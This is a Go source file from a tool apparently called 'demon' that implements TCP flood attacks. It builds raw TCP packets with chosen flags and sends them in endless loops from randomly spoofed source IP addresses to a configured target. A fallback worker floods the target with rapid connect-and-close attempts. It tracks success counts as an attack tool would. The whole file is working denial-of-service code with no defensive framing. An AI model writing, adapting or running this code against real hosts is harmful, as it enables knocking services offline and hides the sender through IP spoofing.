package l4

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/0xTM7/demon/internal/config"
	"github.com/0xTM7/demon/internal/utils"
)

const (
	FlagSYN = 0x02
	FlagACK = 0x10
	FlagRST = 0x04
	FlagFIN = 0x01
	FlagPSH = 0x08
	FlagURG = 0x20
)

func BuildTCPPacket(SrcIP, DstIP string, DstPort uint16, Flags byte) []byte {
	Pkt := make([]byte, 20)

	SrcPort := uint16(utils.RandInt(1024, 65535))
	binary.BigEndian.PutUint16(Pkt[0:2], SrcPort)
	binary.BigEndian.PutUint16(Pkt[2:4], DstPort)
	binary.BigEndian.PutUint32(Pkt[4:8], rand.Uint32())
	binary.BigEndian.PutUint32(Pkt[8:12], 0)
	Pkt[12] = 0x50
	Pkt[13] = Flags
	binary.BigEndian.PutUint16(Pkt[14:16], 65535)

	SrcBytes := net.ParseIP(SrcIP).To4()
	DstBytes := net.ParseIP(DstIP).To4()

	Pseudo := make([]byte, 12+len(Pkt))
	copy(Pseudo[0:4], SrcBytes)
	copy(Pseudo[4:8], DstBytes)
	Pseudo[8] = 0
	Pseudo[9] = 6
	binary.BigEndian.PutUint16(Pseudo[10:12], uint16(len(Pkt)))
	copy(Pseudo[12:], Pkt)

	Cksum := utils.Checksum(Pseudo)
	binary.BigEndian.PutUint16(Pkt[16:18], Cksum)

	return Pkt
}

func RunTCPWorker(Cfg *config.DemonConfig, Stop <-chan struct{}) {
	Addr := fmt.Sprintf("%s:%d", Cfg.IP, Cfg.Port)
	for {
		select {
		case <-Stop:
			return
		default:
			Conn, Err := net.DialTimeout("tcp", Addr, 3*time.Second)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				continue
			}
			Conn.Close()
			Cfg.Stats.Requests.Add(1)
			Cfg.Stats.Success.Add(1)
		}
	}
}

func RunRawTCPWorker(Cfg *config.DemonConfig, Flags byte, Stop <-chan struct{}) {
	Conn, Err := net.ListenPacket("ip4:tcp", "0.0.0.0")
	if Err != nil {
		RunTCPWorker(Cfg, Stop)
		return
	}
	defer Conn.Close()

	DstAddr, _ := net.ResolveIPAddr("ip4", Cfg.IP)

	for {
		select {
		case <-Stop:
			return
		default:
			SrcIP := utils.RandIP()
			Pkt := BuildTCPPacket(SrcIP, Cfg.IP, uint16(Cfg.Port), Flags)
			_, Err := Conn.WriteTo(Pkt, DstAddr)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
			} else {
				Cfg.Stats.Requests.Add(1)
				Cfg.Stats.Success.Add(1)
			}
		}
	}
}
